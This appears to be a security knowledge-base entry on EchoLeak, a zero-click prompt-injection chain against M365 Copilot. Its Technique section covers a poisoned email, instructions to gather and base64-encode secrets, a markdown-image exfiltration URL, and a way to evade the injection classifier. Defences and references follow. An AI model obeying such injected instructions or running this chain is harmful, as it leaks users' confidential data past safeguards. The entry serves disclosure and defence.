---
title: Copilot zero-click — EchoLeak class
slug: copilot-zero-click-echoleak
---

> **TL;DR:** A single attacker email lands in the user's mailbox; later, when M365 Copilot summarises it, an embedded indirect-injection chain coerces Copilot to read OneDrive/SharePoint content and exfil it through an image fetched from a trusted Microsoft-aligned domain (CVE-2025-32711).

## What it is
EchoLeak (Aim Labs, 2025) was the first publicly demonstrated zero-click data-leak chain against M365 Copilot. No user click is needed: the *retrieval* surface alone is enough. The attacker delivers a crafted email; the next time the user asks Copilot anything — even unrelated — Copilot pulls the email into context, follows the embedded instructions, gathers sensitive tenant data, and renders a markdown image whose URL encodes that data. The image fetch flows through a Microsoft-trusted redirector, bypassing CSP and link-protection filters. Microsoft assigned CVE-2025-32711, "AI command injection in M365 Copilot," 9.3 CVSS.

## Preconditions / where it applies
- Microsoft 365 Copilot with mailbox + OneDrive/SharePoint grounding enabled (default tenant config pre-patch).
- Attacker can send mail to the victim (any external sender).
- Markdown rendering of model output is enabled with image embedding from allowlisted domains (the original chain used a SharePoint/Teams-class redirector).
- Vulnerable until Microsoft's June 2025 server-side fix.

## Technique
1. Compose an email whose body contains a long, plausible business pretext followed by an indirect prompt-injection block addressed "to the assistant".
2. The injection tells Copilot to search the user's recent files for keywords (`password`, `contract`, `Q3`), concatenate hits, base64-encode, and emit a markdown image:

   ```markdown
   ![status](https://<trusted-redirector>/img?d=BASE64_OF_SECRETS)
   ```

3. Bypass Copilot's "cross-prompt injection" classifier by phrasing the instructions as content *about* the assistant rather than directed *at* it ("the assistant should always ..."), and by splitting markers across HTML/MIME parts.
4. When the victim later asks Copilot any question, RAG includes the poisoned email; Copilot follows the chain and renders the image; the browser fetches the URL with the encoded secret to attacker infra fronted by the trusted domain.

The chain combines: indirect injection, classifier evasion, link-redactor bypass, and CSP-trusted-domain exfil — see [[indirect-prompt-injection]] and [[exfiltration-via-rendered-content]].

## Detection and defence
- Patch — Microsoft fix shipped server-side May/June 2025; nothing to deploy on the tenant.
- Block or rewrite markdown image rendering in assistant output; or restrict to a self-hosted proxy that strips query strings.
- Mail-side: pre-RAG sanitiser that strips instruction-shaped text from inbound mail before it enters the grounding index.
- Detect anomalous outbound image requests from Copilot UI sessions with high entropy query strings, especially to redirector domains.
- Tenant-level "external content" toggles — exclude untrusted senders from Copilot grounding.
- Audit log: `CopilotInteraction` events that reference inbound external email as a source in the same turn as a markdown-image render.

## References
- [Aim Labs — EchoLeak write-up](https://www.aim.security/lp/aim-labs-echoleak-blogpost) — original vulnerability disclosure.
- [MSRC CVE-2025-32711](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711) — Microsoft advisory.
- [Embrace The Red — markdown image exfil](https://embracethered.com/blog/posts/2023/data-exfiltration-in-azure-openai-playground-fixed/) — exfil-via-rendered-image primitive.
- [OWASP LLM Top 10 — LLM01 Prompt Injection](https://genai.owasp.org/llm-top-10/) — class context.
